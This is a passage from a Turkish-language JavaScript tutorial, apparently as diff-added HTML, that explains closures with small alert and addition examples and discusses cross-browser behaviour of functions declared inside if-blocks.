+<span class="keyw-25">function</span> ekle<span 
+			class="op">(</span>x<span 
+			class="op">) {</span>
+<span class="keyw-50">return function</span> iç<span 
+			class="op">(</span>y<span 
+			class="op">) {</span>
+<span class="keyw-75">return</span> x <span 
+			class="op">+</span> y<span 
+			class="op">;</span>
+<span class="op-25">}</span>
+
+
+<span class="keyw-25">function</span> toplam<span 
+			class="op">() {</span>
+
+<span class="keyw-50">var</span> topla <span 
+			class="op">=</span> ekle<span 
+			class="op">(</span>3<span 
+			class="op">)</span>; 
+
+<span class="pl-50">bilgiYaz</span><span 
+			class="op">(</span>topla<span 
+			class="op">(</span>7)<span 
+			class="op">,</span> <span 
+			class="str">'b2.5.5-uyg-1-sonuç-1'</span><span 
+			class="op">);</span>
+
+<span class="op-25">}</span>
+
+<span class="keyw-50">...</span>
+		</pre>
+		<p>
+			<span class="cursive-green">Sonuç : </span>
+			<span class="cursive-red" id="b2.5.5-uyg-1-sonuç-1"></span>
+		</p>
+		<p class="indent">
+			Yukarıdaki <a href="../uygulamalar/b2.5.5-uyg-1.html">uygulamada</a> tanımlanmış
+			olan  topla<span class="op">()</span> fonksiyonu, geriye bir anonim fonksiyon
+			döndürmektedir. Bu anonim fonksiyon açık (bağlanmamış) bir x değişkeni
+			içermektedir. Bu serbest değişken, bir üst kapsam alanındaki x değişkenin
+			değerini bağlayarak kapalı bir devre oluşturmaktadır. Buna aynen termodinamikte
+			dengede olmayan bir sistemin, en kısa ve en kolay yoldan dengeye ulaşmak istemesi
+			gibi bakabiliriz. 
+		</p>
+		<p class="indent">
+			Bundan sonraki ekle = topla(3); atama ifadesinde, topla fonksiyonu x argümanı için 3 değeri
+			ile değerlendirilerek sonuç ekle değişkenine aktarılmaktadır. topla<span class="op">()</span>
+			fonksiyonu geriye anonim bir fonksiyon referansı döndürmektedir. 
+		</p>
+		<p class="indent">
+			Bundan sonra ekle <span class="op">(</span>7<span class="op">)</span> ifadesi, iç fonksiyonu 
+			çalıştırmakta, dış kapsamdaki bağladığı x değişkeninin değerini okumakta, ve çağrıldığı argümanla 
+			toplamaktadır. Dış fonksiyon geriye değerini döndürüp işlevini tamamlamasına rağmen değişkenlerinin
+			değeri kaybolmamakta ve iç fonksiyon, dış fonksiyonun bir değişkenine erişebilmektedir. 
+		</p>
+		<p class="indent" id="b2.5.5-uyg-2">
+			Yukarıdaki <a href="../uygulamalar/b2.5.5-uyg-1.html">uygulamanın</a> işleyişinin izlenmesi 
+			kolay değildir. Bu kodların daha da karmaşığı, 
+			bir <a href="../uygulamalar/b2.5.5-uyg-2.html">uygulama</a> sayfasında aşağıdaki sonuçları vermekte
+			olan <a href="../uygulamalar/b2.5.5-uyg-2-js.html">JavaScript programı</a> kodlarında görülebilir:		</p>
+		<pre>
+<span class="keyw-50">...</span>
+
+<span class="keyw-25">function</span> dışFonksiyon<span 
+			class="op">(</span>x<span 
+			class="op">) {</span>
+
+<span class="keyw-50">function</span> içFonksiyon<span 
+			class="op">(</span>y<span 
+			class="op">) {</span>
+
+<span class="keyw-75">return</span> x <span 
+			class="op">+</span> y<span 
+			class="op">;</span>
+<span class="op-50">}</span>
+
+<span class="keyw-50">return</span> içFonksiyon<span 
+			class="op">;</span>
+<span class="op-25">}</span>
+
+<span class="pl-25">bilgiYaz</span><span 
+			class="op">(</span>dışFonksiyon<span 
+			class="op">(</span>7<span 
+			class="op">)</span><span 
+			class="op">(</span>3<span 
+			class="op">)</span><span 
+			class="op">,</span> <span 
+			class="str">'b2.5.5-uyg-2-sonuç-1'</span><span 
+			class="op">);</span>
+<span class="keyw-50">...</span>
+		</pre>
+		<p>
+			<span class="cursive-green">Sonuç : </span>
+			<span class="cursive-red" id="b2.5.5-uyg-2-sonuç-1"></span>
+		</p>
+		<p class="indent">
+			Yukarıdaki <a href="../uygulamalar/b2.5.5-uyg-2.html">uygulamanın</a> işleyişinin
+			izlenmesi daha da güçtür. Burada ilk çağrı dış fonksiyona 7 parametresi
+			ile yapılmaktadır. Bu çağrı, çağrının yapıldığı değişkene iç fonksiyonun çağrılabilme
+			olanağını döndürmektedir. İkinci 3 parametresi iç fonksiyonu çağırmaktadır.
+			Dış fonksiyon işlevini tamamlamış, değerini döndürmiüş ve çıkmıştır. Buna
+			rağmen, JavaScript programlama diline özgü ve başka programlama dillerinde
+			az bulunan bir saklama tarzı ile çıkmış olan dış fonksiyonun değişkenlerine
+			iç fonksiyon erişebilmektedir. Bu durumda, iç fonksiyon dış fonksiyonun
+			henüz erişilebilir durumda olan çağrı parametresi x değerine erişmekte, bunu
+			kendi parametresi ile toplamakta (sistem kapanmakta) (denge durumu) ve sonucu
+			döndürmektedir. Gerçekten bu çok &quot;cool&quot; bir işleyiştir.
+		</p>
+		<p class="indent">
+			Bu çok elegan görünümlü yöntemin sınırı yoktur. Fonksiyonlar istenildiğ kadar derinlikte
+			içiçe yuvalanabilmekte, istenildiği kadar karmaşık yapıda kapalı devreler yapılabilmekte ve 
+			akla hayale gelmeyen uygulamalar yaratılabilmektedir. Bu yöntemin avantajları yanında çok da 
+			sakıncaları bulunmaktadır. 
+		</p>
+		<p class="indent">
+			Bu sakıncaların en önemlisi, işin teknik yönüdür. Bir kapalı devrede global kapsam 
+			alanının altında bir dış onun da altında bir iç kapsam açılmaktadır. Normal olarak,
+			fonksiyonlar, değerini döndürüp çıkınca ve programda artık bu fonksiyona başka çağrı
+			yapılmıyorsa, yani çağrı kapalı ise, JavaScript yorumlayıcısının çöp toplayıcısı devreye 
+			girmekte ve bu bellek bölgesini temizleyerek genel programın kullanımına geri vermektedir. 
+			Kapalı devrelerde ise, bu kapsamlara, üst kapsam alanlarından çağrılar kapanmamaktadır. Hatırlandığı gibi,
+			kapalı devreler, açık bir sistemdir, dengesizdir ve dengeye erişme gayreti içindedir, dengeye ulaşması için,
+			üst kapsam alanının değişkenine gereksinmesi vardır ve bu çağrısını daima canlı tutar. Bu durumda
+			JavaScript yorumlayıcısının çöp toplayıcısı, çağrının var olduğunu algılayıp kapalı devrenin işgal ettiği bellek
+			alanını temizleyemez. Daha da kötüsü, dış bölgeden kapalı bölgeye yapılacak her çağrı, 
+			farklı parametrelerle yapıldığı için, farklı kapalı devreler açar, bu çağrılar özellikle bir döngü sisteminden 
+			yapılıyorsa, program belleği (stack memory) hızla tütetilebilir. Döngü olmasa da programda kapalı 
+			devrelere yapılacak her çağrı program belleğini kullanmaya devam eder. Buna bellek sızıntısı denilir ve 
+			sonunda program devreden çıkabilir. Özellikle Internet Explorer bu konuda daha da duyarlıdır. 
+		</p>
+		<p class="indent">
+			Bellek sızıntısı sorunu, kapalı devrelerin gereksiz yere kullanımını kesin olarak engeller. Bellek sızıntısı
+			yaratacağını bile bile ne kadar elegan ve profesyonel görünürse görünsün, hiçbir yöntem uygulanamaz.
+			Bu yönteme ancak gerektiği zamanlarda ve kısıtlı olarak başvurulabilir. Özetle, genel olarak, programlarda
+			içiçe fonksiyon tanımlarından kaçınmak gerekir.
+		</p>
+		<p class="indent">
+			Kapalı devrelerde dikkat edilmesi gereken  konulardan birisi de, isim çakışmalarıdır. İçiçe kapsamlarda 
+			değişkenlerin adları aynı olursa, bu bir isim çakışmasına neden olur. Çakışan değişken isimlerinin içeriği,
+			kapsam değiştikçe değişir ve öncelik en iç kapsama verilir. Bu durumda, programda mantık hataları ortaya 
+			çıkabilir ve bilindiği gibi mantık hataları izlenmesi, farkında olunması ve düzeltilmesi en zor olan
+			bazen yıllarca farkedilemeden zarar vermeye devam edebilen hatalardır. Bu hataların oluşabilmesine 
+			olanak vermemek için alınacak önlemlerden biri de bilinçsiz isim çakışmalarına neden olunmamasıdır.
+		</p>
+		<p class="indent">
+			Yakın bir tarihte 
+			<a href="http://www.vimeo.com/1967261?pg=embed&amp;sec=1967261">Stuart Langridge</a>
+			kapalı devrelerin çok güçlü programlama araçları olduğunu ve vadettikleri
+			gelişmeleri iki video konferansı halinde açıklamaktadır. Çok ileri düzey uygulamalarını
+			içeren bu açıklamalar, belki normal kullanıcılar için fazla anlaşılabilir
+			olmayacaktır. Diğer taraftan, 
+			<a href="http://www.crokford.com/javascript/private.html">Douglas Crokford</a>
+			başka hiçbir yöntemle gerçekleştirilemeyecek nesne sınıfları için private
+			members yaratılabilmesinin kapalı devreler  ile gerçekleşebileceğini göstermiştir.
+			Bir başka kapalı devreler taraftarı da 
+			<a href="http://www.nczonline.net/blog/2006/09/07/closures-considered-harmful/">DustinDiaz</a> 
+			olarak belirtilebilir. Diğer taraftan,
+			<a href="http://www.nczonline.net/blog/2006/09/07/closures-considered-harmful/">Nicolas Zakas</a> 
+			bu tür programların JavaScript programlama dilinin amaçları dışına taştığını, zor okunan karışık programlar 
+			yarattığını,  bunların normal yöntemlerle de programlanabileceğini düşünmektedirler. 
+		</p>
+				<p class="indent">
+			Genel olarak, kapalı devreleri kullanmaktan kaçınan programcılar,
+		</p>
+		<ul class="list">
+			<li>Kapalı devreleri içeren programların okunmasının güçlüğünü,</li>
+			<li>Kodlamada bir hata yapılırsa invasive sonuçların oluşabildiği, (program belleğinin aşırı yüklenmesi),</li>
+			<li>Çop toplayıcısının iyi çalışmaması halinde program belleğinin kontrolsüz yüklenmesini,</li>
+			<li>Farkında olmadan circular references (biribirini kontrolsuz çağıran sistemler) yaratılabileceğini </li>
+			
+		</ul>
+		<p class="nonindent">
+			belirterek, kapalı devreleri kullanmakatan kaçınmaktadırlar. Aslında, küçük programlar için,
+			çekinilecek hiçbir şey yoktur ve uygulamacılar kapalı devreleri -dikkatli olmak koşulu ile- 
+			özgürce kullanabilirler.
+		</p>
+				<p class="indent" id="b2.5.5-uyg-3">
+			Kapalı devrelere klasik bir örnek olarak, 
+			<a href="../uygulamalar/b2.5.5-uyg-3-js.html">JavaScript kodları</a> 
+			aşağıda görülen bir <a href="../uygulamalar/b2.5.5-uyg-3.html">uygulama</a>
+			verilmiştir.		</p>
+				<pre>
+<span class="comm-25">/* &lt;![CDATA[  */</span>
+			
+<span class="comm-25">/* Bu Program bdelib.js Kitaplık Programını Kullanmaktadır */</span>
+
+
+<span class="keyw-25">function</span> söylem1<span 
+			class="op">(</span>metin<span 
+			class="op">) {</span>
+
+<span class="keyw-50">var</span> sözler <span 
+			class="op">=</span> <span 
+			class="str">'Bugün 23 Nisan \n'</span> <span 
+			class="op">+</span> metin<span 
+			class="op">;</span>
+
+<span class="keyw-50">var</span> söyle <span 
+			class="op">=</span> <span 
+			class="keyw">function</span><span 
+			class="op">() {</span>
+
+<span class="keyw-75">alert</span><span 
+			class="op">(</span>sözler<span 
+			class="op">);</span>
+
+<span class="op-50">}</span>
+
+<span class="keyw-50">return</span> söyle<span 
+			class="op">;</span>
+<span class="op-25">}</span>
+
+
+
+<span class="keyw-25">function</span> mesaj1<span 
+			class="op">() {</span>
+
+<span class="keyw-50">var</span> bildiri <span 
+			class="op">=</span> söylem1<span 
+			class="op">(</span><span 
+			class="str">'Büyük Millet Meclisi Bugün Kuruldu !'</span><span 
+			class="op">);</span><span class="comm-50">// Dış Fonksiyon</span>
+
+<span class="pl-50">bildiri</span><span 
+			class="op">();</span><span class="comm-50">// İç Fonksiyon</span>
+
+<span class="keyw-50">return false</span><span 
+			class="op">;</span><span class="comm-50">// Çapa Elementinin href Niteliği İptal Edilliyor !</span>
+<span class="op-25">}</span>
+
+
+<span class="keyw-25">function</span> başlat1<span 
+			class="op">(){</span>
+
+<span class="keyw-50">var</span> a <span 
+			class="op">=</span> <span 
+			class="keyw">document</span><span 
+			class="op">.</span><span 
+			class="keyw">getElementById</span><span 
+			class="op">(</span><span 
+			class="str">'tab1'</span><span 
+			class="op">);</span>
+
+<span class="pl-50">a</span><span 
+			class="op">.</span><span 
+			class="keyw">onclick</span> <span 
+			class="op">=</span> mesaj1<span 
+			class="op">;</span>
+<span class="op-25">}</span>
+
+
+<span class="pl-25">sayfaYüklendiktenSonraÇalıştır<span 
+			class="op">(</span>başlat1</span><span 
+			class="op">);</span>
+
+<span class="comm-25">/*   ]]&gt;  */</span>
+		</pre>
+		<ul id="center-navlist">
+			<li>
+				<a href="http://www.olmayanyer.com/" id="tab1"><em>Mesaj Göster !</em></a>
+			</li>
+		</ul>
+		<p class="dikeyTab-25"></p>
+		<p class="indent">
+			Yukarıdaki <a href="../uygulamalar/b2.5.5-uyg-3.html">uygulamanın</a>,
+			<a href="../uygulamalar/b2.5.5-uyg-3-js.html">JavaScript kodları</a> 
+			incelendiğinde sadece söylem<span class="op">()</span> fonksiyonunun
+			kapalı devrelerle ilgili olduğunu, programın diğer kısımlarının, programın
+			interaktivitesini sağlamak amacı ile eklendiği görülebilir. Bu fonksiyonun tanım
+			alanında bir iç söyle<span class="op">()</span> fonksiyonu olduğunu
+			ve bu iç söyle fonksiyonun, dış söylem<span class="op">()</span> 
+			fonksiyonunun sözler değişkenini kullandığını görülmektedir. Bu bir 
+			klasik kapalı devredir.		</p>
+		<p class="nonindent" id="b2.5.5-uyg-4">
+			Çok sıradışı bir başka kapalı devre 
+			<a href="../uygulamalar/b2.5.5-uyg-4.html">uygulamasının</a> 
+			<a href="../uygulamalar/b2.5.5-uyg-4-js.html">JavaScript kodları</a> 
+			ve uygulama sonuçları aşağıda görülmektedir:
+		</p>
+		<pre>
+<span class="comm-25">/* &lt;![CDATA[  */</span>
+			
+<span class="comm-25">/* Bu Program bdelib.js Kitaplık Programını Kullanmaktadır */</span>
+
+
+<span class="keyw-25">function</span> söylem2<span 
+			class="op">(</span>metin<span 
+			class="op">) {</span>
+
+<span class="keyw-50">var</span> sözler <span 
+			class="op">=</span> <span 
+			class="str">'Bugün 23 Nisan \n'</span> <span 
+			class="op">+</span> metin<span 
+			class="op">;</span>
+
+<span class="keyw-50">var</span> söyle <span 
+			class="op">=</span> <span 
+			class="keyw">function</span><span 
+			class="op">() {</span>
+
+<span class="keyw-75">alert</span><span 
+			class="op">(</span>sözler<span 
+			class="op">);</span>
+
+<span class="op-50">}</span>
+
+<span class="keyw-50">return</span> söyle<span 
+			class="op">;</span>
+<span class="op-25">}</span>
+
+
+
+<span class="keyw-25">function</span> mesaj2<span 
+			class="op">() {</span>
+
+<span class="pl-50">söylem2</span><span 
+			class="op">(</span><span 
+			class="str">'Neşe Doluyor İnsan !'</span><span 
+			class="op">)();</span><span class="comm-50">// Dış ve İç Fonksiyon</span>
+
+<span class="keyw-50">return false</span><span 
+			class="op">;</span><span class="comm-50">// Çapa Elementinin href Niteliği İptal Edilliyor !</span>
+<span class="op-25">}</span>
+
+
+
+
+<span class="keyw-25">function</span> başlat2<span 
+			class="op">() {</span>
+
+<span class="keyw-50">var</span> a <span 
+			class="op">=</span> <span 
+			class="keyw">document</span><span 
+			class="op">.</span><span 
+			class="keyw">getElementById</span><span 
+			class="op">(</span><span 
+			class="str">'tab2'</span><span 
+			class="op">);</span>
+
+<span class="pl-50">a</span><span 
+			class="op">.</span><span 
+			class="keyw">onclick </span> <span 
+			class="op">=</span> mesaj2<span 
+			class="op">;</span>
+<span class="op-25">}</span>
+
+
+<span class="pl-25">sayfaYüklendiktenSonraÇalıştır<span 
+			class="op">(</span>başlat2</span><span 
+			class="op">);</span>
+
+<span class="comm-25">/*   ]]&gt;  */</span>
+		</pre>
+		<ul id="center-navlist">
+			<li>
+				<a href="http://www.olmayanyer.com/" id="tab2"><em>Mesaj Göster !</em></a>
+			</li>
+		</ul>
+		<p class="dikeyTab-25"></p>
+		<p class="nonindent" id="b2.5.5-uyg-5">
+			Bu <a href="../uygulamalar/b2.5.5-uyg-4.html">uygulamada</a> söylem<span 
+			class="op">()</span> fonksiyonun bellek alanında bulunan söyle değişkeninin
+			referansı olan fonksiyonun döndürdüğü değere erişim için çok sıradışı <span 
+			class="op">() ()</span> çift gruplama operatörü kullanılmıştır. Bu 
+			<a href="../uygulamalar/b2.5.5-uyg-4.html">uygulamanın</a>, yardımcı değişken 
+			kullanılan bir önceki <a href="../uygulamalar/b2.5.5-uyg-3.html">uygulamadan</a>
+			tek farkı doğrudan çağrı yapılmış olunmasıdır. Bu çok sıradışı çağrı içeren son
+			<a href="../uygulamalar/b2.5.5-uyg-4.html">uygulamayı</a>, sıradan bir 
+			kapalı devre <a href="../uygulamalar/b2.5.5-uyg-5.html">uygulaması</a> haline 
+			getirerek sıradan bir çağrı içermesini sağlayan JavaScript
+			<a href="../uygulamalar/b2.5.5-uyg-5-js.html">kodları</a> aşağıda görülmektedir :
+		</p>
+		<pre>
+<span class="comm-25">/* &lt;![CDATA[  */</span>
+			
+<span class="comm-25">/* Bu Program bdelib.js Kitaplık Programını Kullanmaktadır */</span>
+
+
+<span class="keyw-25">function</span> söylem3<span 
+			class="op">(</span>metin<span 
+			class="op">) {</span>
+
+<span class="keyw-50">var</span> sözler <span 
+			class="op">=</span> <span 
+			class="str">'Bugün 23 Nisan \n'</span> <span 
+			class="op">+</span> metin<span 
+			class="op">;</span>
+
+<span class="keyw-50">var</span> söyle <span 
+			class="op">=</span> <span 
+			class="keyw">function</span><span 
+			class="op">() {</span>
+
+<span class="keyw-75">alert</span><span 
+			class="op">(</span>sözler<span 
+			class="op">);</span>
+
+<span class="op-50">}</span>
+
+<span class="keyw-50">return</span> söyle<span 
+			class="op">;</span>
+<span class="op-25">}</span>
+
+
+
+<span class="keyw-25">function</span> mesaj3<span 
+			class="op">() {</span>
+
+<span class="pl-50">söylem3</span><span 
+			class="op">(</span><span 
+			class="str">'Neşe Doluyor İnsan !'</span><span 
+			class="op">);</span><span class="comm-50">// Dış ve İç Fonksiyon</span>
+
+<span class="keyw-50">return false</span><span 
+			class="op">;</span><span class="comm-50">// Çapa Elementinin href Niteliği İptal Edilliyor !</span>
+<span class="op-25">}</span>
+
+
+
+
+<span class="keyw-25">function</span> başlat3<span 
+			class="op">() {</span>
+
+<span class="keyw-50">var</span> a <span 
+			class="op">=</span> <span 
+			class="keyw">document</span><span 
+			class="op">.</span><span 
+			class="keyw">getElementById</span><span 
+			class="op">(</span><span 
+			class="str">'tab3'</span><span 
+			class="op">);</span>
+
+<span class="pl-50">a</span><span 
+			class="op">.</span><span 
+			class="keyw">onclick </span> <span 
+			class="op">=</span> mesaj3<span 
+			class="op">;</span>
+<span class="op-25">}</span>
+
+
+<span class="pl-25">sayfaYüklendiktenSonraÇalıştır<span 
+			class="op">(</span>başlat3</span><span 
+			class="op">);</span>
+
+<span class="comm-25">/*   ]]&gt;  */</span>
+		</pre>
+		<ul id="center-navlist">
+			<li>
+				<a href="http://www.olmayanyer.com/" id="tab3"><em>Mesaj Göster !</em></a>
+			</li>
+	</ul>
+		<p class="dikeyTab-25"></p>
+		<p class="indent" id="b2.5.5-uyg-6">
+			Aynı işlevi, kapalı devre oluşturan iç  fonksiyonuna gerek olmadan çözümleyen
+			<a href="../uygulamalar/b2.5.5-uyg-6.html">uygulamanın</a> 
+			<a href="../uygulamalar/b2.5.5-uyg-6-js.html">JavaScript kodları</a> aşağıda 
+			görülmektedir:
+		</p>
+		<pre>
+<span class="comm-25">/* &lt;![CDATA[  */</span>
+			
+<span class="comm-25">/* Bu Program bdelib.js Kitaplık Programını Kullanmaktadır */</span>
+
+
+<span class="keyw-25">function</span> söylem4<span 
+			class="op">(</span>metin<span 
+			class="op">) {</span>
+
+<span class="keyw-50">var</span> sözler <span 
+			class="op">=</span> <span 
+			class="str">'Bugün 23 Nisan \n'</span> <span 
+			class="op">+</span> metin<span 
+			class="op">;</span>
+
+<span class="keyw-75">alert</span><span 
+			class="op">(</span>sözler<span 
+			class="op">);</span>
+
+<span class="op-25">}</span>
+
+
+
+<span class="keyw-25">function</span> mesaj4<span 
+			class="op">() {</span>
+
+<span class="pl-50">söylem4</span><span 
+			class="op">(</span><span 
+			class="str">'Neşe Doluyor İnsan !'</span><span 
+			class="op">);</span><span class="comm-50">// Dış ve İç Fonksiyon</span>
+
+<span class="keyw-50">return false</span><span 
+			class="op">;</span><span class="comm-50">// Çapa Elementinin href Niteliği İptal Edilliyor !</span>
+<span class="op-25">}</span>
+
+
+
+
+<span class="keyw-25">function</span> başlat4<span 
+			class="op">() {</span>
+
+<span class="keyw-50">var</span> a <span 
+			class="op">=</span> <span 
+			class="keyw">document</span><span 
+			class="op">.</span><span 
+			class="keyw">getElementById</span><span 
+			class="op">(</span><span 
+			class="str">'tab4'</span><span 
+			class="op">);</span>
+
+<span class="pl-50">a</span><span 
+			class="op">.</span><span 
+			class="keyw">onclick </span> <span 
+			class="op">=</span> mesaj4<span 
+			class="op">;</span>
+<span class="op-25">}</span>
+
+
+<span class="pl-25">sayfaYüklendiktenSonraÇalıştır<span 
+			class="op">(</span>başlat4</span><span 
+			class="op">);</span>
+
+<span class="comm-25">/*   ]]&gt;  */</span>
+		</pre>
+		<ul id="center-navlist">
+			<li>
+				<a href="http://www.olmayanyer.com/" id="tab4"><em>Mesaj Göster !</em></a>
+			</li>
+			<li id="cn-sonlama3"></li>
+	</ul>
+		<p class="dikeyTab-25"></p>
+		<p class="indent">
+			Kodlardan görülebileceği gibi, kapalı devrelerden kaçınmak için çoğu zaman bir 
+			yol bulunabilmektedir. Eğer bir işlevin yapılabilmesi için gereken kodlar,
+			kapalı devreler olmadan çözümlenebiliyorsa, kapalı devrelere başvurulmayan 
+			yöntemin uygulanması daha uygun olacaktır.
+		</p>
+		<p class="indent">
+			Kaplı devreler konusunda, günümüzdeki gelişmeler, bu yöntemlerin giderek attığını ve hergün daha çok 
+			kapalı devrelerin uygulandığı yöntemlerin açıklandığı yönündedir. Bu çalışma alanının yeni olması, 
+			insanların yeni şeyleri keşfetme içgüdülerini büyük ölçüde etkilemiş görünmektedir. Son bilgiler, 
+			bellek sızıntılarının korkulacak kadar olmadığını, web sayfalarından çıkılınca, ortadan kalkacağını 
+			belirtmektedir. Yine de, başka yöntemlerle	yapılabilecek çalışmalar için, kapalı devrelerin
+			kullanılmasından kaçınmak şimdilik uygun bir davranış olacaktır.
+		</p>
+		<p class="indent">
+			Kapalı devreler hakkında temel bilgileri burada inceledik ve artık konu ile ilgili 
+			genel bir bilgi almış durumdayız. Kapalı devreler (Closures) konusu çok geniş ve 
+			çok kuramsaldır. Bu konu çok aktif olarak çalışılmakta ve yeni bilgiler 
+			yayınlanmaktadır. Bu konu ile ilgili, daha fazla bilgi için, <a 
+			href="http://jibbering.com/faq/faq_notes/closures.html">Richard Cornford</a>
+			tarafından yazılmış olan kuramsal incelemenin, 
+			çok güzel bir JavaScript tanıtımı olan <a 
+			href="http://www.crockford.com/javascript/private.html">Douglas Crockford</a>
+			'un incelemesinin ve Internet Explorerdeki 
+			Bellek Kaçakları (Memory Leaks) probroblemlerinin
+			kapalı devrelerle azaltılabilmesini açıklayan <a
+			href="http://www.codeproject.com/KB/scripting/leakpatterns.aspx">Volkan Özçelik</a>
+			tarafından yazılmış incelemenin okunması sağlık verilebilir. Buradaki incelemeler, 
+			daha çok, <a href="http://blog.morrisjohns.com/javascript_closures_for_dummies.html">Morris Johns</a>
+			ve <a 
+			href="http://www.codeproject.com/KB/scripting/Closures_in_JavaScript.aspx">SachinKumarK</a>
+			tarafından yapılmış açıklamalardan yararlanılarak hazırlanmıştır.
+		</p>
+		<p class="subheading" id="conditional">2.5.6 - Fonksiyonların Koşullu olarak Oluşturulmaları 
+	</p>
+		<p class="indent" id="b2.5.6-uyg-1">
+			Fonksiyonların bir koşulun gerçekleşmesi ile yaratılması bazen yararlı
+			olabilir. Özellikle,  ismi aynı fakat içeriği farklı olan fonksiyonların
+			yaratılması için, koşullu ifadeler yararlı olacaktır. Fonksiyonların, fonksiyon
+			bildirimi ile koşullu ifadeler ile yaratılmaları  bazen yanıltıcı sonuçlar
+			verebilmektedir. Bu konuda bir 
+			<a href="../uygulamalar/b2.5.6-uyg-1-js.html">JavaScript programı</a> ve bağlantılı
+			olduğu <a href="../uygulamalar/b2.5.6-uyg-1.html">uygulama</a> sayfasında verdiği
+			sonuç, aşağıda görülmektedir:
+		</p>
+		
+		<pre>
+<span class="keyw-50">...</span>
+
+<span class="keyw-50">var</span> f <span 
+			class="op">=</span> <span 
+			class="keyw">false</span><span 
+			class="op">,</span> k <span 
+			class="op">=</span> <span 
+			class="keyw">null</span><span 
+			class="op">;</span>
+<span class="keyw-50">if</span><span 
+			class="op">(</span> f<span 
+			class="op">===</span><span 
+			class="keyw">true</span><span 
+			class="op">) {</span>
+<span class="keyw-75">function</span> d<span 
+			class="op">() {</span>
+<span class="keyw-100">return</span> 99<span 
+			class="op">;</span>
+<span class="op-75">}</span>
+
+<span class="pl-50">k</span> <span 
+			class="op">=</span> d<span 
+			class="op">;</span>
+
+<span class="keyw-50">if</span> <span 
+			class="op">(</span><span 
+			class="keyw">typeof</span> k<span 
+			class="op">==</span><span 
+			class="str">'function'</span><span 
+			class="op">) {</span>
+
+<span class="pl-75">bilgiYaz</span><span 
+			class="op">(</span>k<span class="op">()</span><span 
+			class="op">,</span> <span 
+			class="str">'2.5.6-uyg-1-sonuç-1'</span><span 
+			class="op">)</span><span 
+			class="op">;</span>
+
+<span class="op-50">}</span>
+
+<span class="keyw-50">else</span><span 
+			class="op"> {</span>
+
+<span class="pl-75">bilgiYaz</span><span 
+			class="op">(</span><span 
+			class="str">'Fonksiyon Oluşturulmadı!'</span><span 
+			class="op">,</span> <span 
+			class="str">'2.5.6-uyg-1-sonuç-1'</span><span 
+			class="op">)</span><span 
+			class="op">;</span>
+
+<span class="op-50">}</span>
+
+<span class="keyw-50">...</span>
+		</pre>
+		<p>
+			<span class="cursive-green">Sonuç : </span>
+			<span class="cursive-green">Internet Explorer</span><span class="cursive-red">99</span><br />
+			<span class="cursive-green">FireFox</span><span class="cursive-red">Hata !</span></p>
+		<p class="indent" id="b2.5.6-uyg-2">
+			Bu <a href="../uygulamalar/b2.5.6-uyg-1.html">uygulamada</a>, <span class="keyw">if</span>
+			bloğu içinde yapılan fonksiyon tanımı, bir fonksiyon bildirimi gibi görünmesine
+			karşın, bir  fonksiyon literalidir. Çünkü bir ifade içinde tanımlanmaktadır.
+			Normal olarak bu  fonksiyonun tanımlanmamış olması gerekir, çünkü, mantıksal
+			koşul gerçekleşmemiş  olduğundan, program akışı tanımın yapıldığı <span class="keyw">if</span>
+			bloğu içinden devam etmemektedir. Bu durumda, programın fonksiyonun 
+			oluşmadığı şeklinde mesaj vererek çıkması gerekir. Bu beklenen davranış
+			sadece FireFox tarafından gösterilmektedir. Internet Explorer, Chrome,
+			Safari, Opera, belge çözümleyicilerin en son sürümleri, fonksiyonu tanımlanmış
+			olarak kabul ederek sonucu görüntülemektedirler. Durum gerçekten çok can
+		sıkıcıdır.
+		</p>
+		<p class="indent">
+			Belge çözümleyicilerin JavaScript yorumlayıcıları arasındaki bu değerlendirme
+			farkını ortaya çıkmasının nedeni yukarıdaki programın kendisidir. Bu
+			programda, bir ifade içinde fonksiyon tanımına çalışılmıştır. Halbuki
+			ECMA-262 sürüm 3 final spesifikasyonu, fonksiyon tanımının sadece global alan ve 
+			fonksiyon alanları içinde ve ifade ve döngüler
+			dışında yapılmasını öngörmektedir. Bu durumda, <span class="keyw">if</span>
+			bloğu içinde yapılan fonksiyon bildirimi tanımı yasal değildir ve gerçekte
+			bir fonksiyon literalidir. Bu yüzden bazı belge çözümleyicilerin JavaScript
+			yorumlayıcıları bu ifadeyi bir ifade kabul edip fonksiyon tanımını yapan
+			bloğu atlamakta, büyük bir çoğunluk ise, bunu bir fonksiyon bildirimi kabul
+			edip, istenilenin aksine, fonksiyonu tanımlayarak hesapladığı sonucu 
+			görüntülemektedirler.
+		</p>
+		<p class="indent">
+			Bu programın istenilen yönde, çalışmasının sağlanması için alınacak 
+			tek önlem bulunmaktadır. Bu önlem, spesifikasyonda öngörüldüğü gibi, 
+			fonksiyon tanımlarını, <span class="keyw">if</span> 
+			ve döngü blokları içinden yapmamak bu blokların içlerinde fonksiyonları 
+			sadece fonksiyon literali olarak tanımlamaktadır. Bu şekilde, mantıksal 
+			program akışı, tanımın yapıldığı karar bloğununa 
+			girmeden devam edecek ise, fonksiyon da kesin olarak tanımlanmış 
+			olmayacaktır. Bu konuda bir 
+			<a href="../uygulamalar/b2.5.6-uyg-2-js.html">JavaScript programı</a> 
+			ve bağlantılı olduğu <a href="../uygulamalar/b2.5.6-uyg-2.html">uygulama</a>
+			sayfasında verdiği sonuç, aşağıda görülmektedir:
+		</p>
+			<pre>
+<span class="keyw-50">...</span>
+
+<span class="keyw-50">var</span> f <span 
+			class="op">=</span> <span 
+			class="keyw">false</span><span 
+			class="op">,</span> k <span 
+			class="op">=</span> <span 
+			class="keyw">null</span><span 
+			class="op">;</span>
+<span class="keyw-50">if</span><span 
+			class="op">(</span> f<span 
+			class="op">===</span><span 
+			class="keyw">true</span><span 
+			class="op">) {</span>
+<span class="pl-75">k</span> <span 
+			class="op">=</span> <span 
+			class="keyw">function</span><span 
+			class="op">() {</span>
+<span class="keyw-100">return</span> 99<span 
+			class="op">;</span>
+<span class="op-75">}</span>
+
+<span class="keyw-50">if</span> <span 
+			class="op">(</span><span 
+			class="keyw">typeof</span> k<span 
+			class="op">==</span><span 
+			class="str">'function'</span><span 
+			class="op">) {</span>
+
+<span class="pl-75">bilgiYaz</span><span 
+			class="op">(</span>k<span class="op">()</span><span 
+			class="op">,</span> <span 
+			class="str">'2.5.6-uyg-2-sonuç-1'</span><span 
+			class="op">)</span><span 
+			class="op">;</span>
+
+<span class="op-50">}</span>
+
+<span class="keyw-50">else</span><span 
+			class="op"> {</span>
+
+<span class="pl-75">bilgiYaz</span><span 
+			class="op">(</span><span 
+			class="str">'Fonksiyon Oluşturulmadı!'</span><span 
+			class="op">,</span> <span 
+			class="str">'2.5.6-uyg-2-sonuç-1'</span><span 
+			class="op">)</span><span 
+			class="op">;</span>
+
